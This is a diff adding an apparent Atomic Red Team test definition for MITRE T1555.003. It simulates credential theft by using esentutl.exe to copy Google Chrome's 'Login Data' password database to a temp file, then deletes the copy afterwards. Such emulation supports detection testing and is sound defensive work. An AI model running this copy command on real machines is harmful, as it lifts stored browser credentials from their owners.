@@ -1,0 +1,37 @@
+{
+    "name": "Dump Chrome Login Data with esentutl",
+    "description": "This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database. [Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "command_prompt",
+        "command": "esentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"#{output_path}\"\n",
+        "cleanup_command": "del /f /q #{output_path} > nul 2>&1\n",
+        "type": "Command Executor"
+    },
+    "id": "T1555.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Web Browsers",
+    "source": "ART",
+    "uuid": "70422253-8198-4019-b617-6be401b49fce",
+    "arguments": {
+        "output_path": {
+            "description": "File path for login data dump",
+            "type": "string",
+            "default": "%temp%\\T1555.003_Login_Data.tmp"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Chrome must be installed\n",
+            "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
